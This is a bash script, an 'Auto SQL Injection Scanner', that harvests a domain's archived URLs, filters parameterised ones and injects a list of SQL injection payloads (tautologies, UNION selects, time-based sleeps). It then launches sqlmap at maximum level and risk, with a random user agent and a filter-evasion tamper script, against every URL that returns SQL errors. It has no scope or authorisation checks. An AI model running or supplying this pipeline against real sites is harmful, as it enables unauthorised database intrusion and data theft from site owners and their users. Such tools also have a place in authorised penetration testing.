#!/bin/bash

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo "💉 Auto SQL Injection Scanner"

# Input
read -p "Enter target domain (e.g., example.com): " domain
if [[ -z "$domain" ]]; then
  echo "❌ Domain required."
  exit 1
fi

folder="sqli-recon-$domain-$(date +%Y%m%d-%H%M%S)"
mkdir "$folder"
cd "$folder" || exit
touch confirmed_sqli.txt

echo "📂 Output folder: $folder"

# Step 1: Gather URLs
echo -e "${YELLOW}🔎 Gathering URLs...${NC}"
gau "$domain" > gau_urls.txt
waybackurls "$domain" > wayback.txt
cat gau_urls.txt wayback.txt | sort -u > all_urls.txt

echo "🔍 Filtering URLs with parameters..."
grep -E "(\?|&)(id|search|item|query|cat|q|uid|product)=" all_urls.txt > candidates.txt

echo "🧠 Found $(wc -l < candidates.txt) candidate URLs."

if [[ ! -s candidates.txt ]]; then
  echo "❌ No injection points found."
  exit 1
fi

# Step 2: Define payloads
payloads=(
"'"
"'--"
"' or '1'='1"
"\" or \"1\"=\"1"
"' OR 1=1--"
"' OR 'a'='a"
"' and sleep(5)--+"
"admin' --"
"' union select null--"
"' union select 1,2--"
"' or 1=1 limit 1;--"
"' and 1=0 union select 1,2--"
"' or 'a'='a' --"
"' || '1'='1"
"') or ('1'='1"
"'))--"
"') or sleep(5)--"
)

# Step 3: Fuzz each param
fuzz_url() {
  base_url="$1"
  echo -e "${YELLOW}🔧 Testing: $base_url${NC}"

  for payload in "${payloads[@]}"; do
    injected=$(echo "$base_url" | sed "s/=\([^&]*\)/=\1$payload/g")
    response=$(curl -s --max-time 10 "$injected")

    # Check generic SQL error messages
    if echo "$response" | grep -qE "SQL syntax|mysql_fetch|ORA-|SQLite|ODBC|warning|unterminated|PDO|Fatal error|syntax error"; then
      echo -e "${GREEN}[+] SQL Injection Detected: $injected${NC}"
      echo "$injected" >> confirmed_sqli.txt
      break
    fi
  done
}

# Step 4: Fuzz manually
echo -e "${YELLOW}🚀 Starting manual fuzzing...${NC}"
while IFS= read -r url; do
  fuzz_url "$url"
done < candidates.txt

# Step 5: Run sqlmap (on successful ones or all)
echo -e "${YELLOW}🤖 Running sqlmap on confirmed URLs...${NC}"
while IFS= read -r target; do
  echo -e "${YELLOW}🔎 Sqlmap testing: $target${NC}"
  sqlmap -u "$target" --batch --random-agent --level=5 --risk=3 --tamper=space2comment --threads=4 --output-dir="$folder/sqlmap" >> sqlmap_results.txt
done < confirmed_sqli.txt

echo -e "\n✅ Scan complete. Check ${GREEN}confirmed_sqli.txt${NC} & sqlmap_results.txt"
